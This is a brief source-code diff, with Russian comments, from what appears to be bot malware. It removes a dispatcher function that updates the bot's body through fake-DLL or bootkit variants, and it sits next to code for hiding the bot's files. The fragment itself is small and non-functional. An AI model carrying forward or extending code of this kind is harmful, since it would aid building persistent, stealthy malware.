@@ -1246,22 +1246,6 @@ TBotType BOT::GetBotType()
 {
 	return BotType;
 }
-//----------------------------------------------------------------------------
-
-
-#ifdef BOTPLUG
-// Функция обновляет тело bot.plug
-bool BOT::UpdateBotPlug(BYTE* data, int c_data)
-{
-	switch (GetBotType()) {
-		case BotFakeDll: return UpdateBotFakeDll(data, c_data);
-		case BotBootkit: return UpdateBotBootkit(data, c_data);
-    default:
-        return false;
-	}
-}
-#endif
-
 
 //----------------------------------------------------
 //  Функции для обеспечения сокрытия служебных файлов
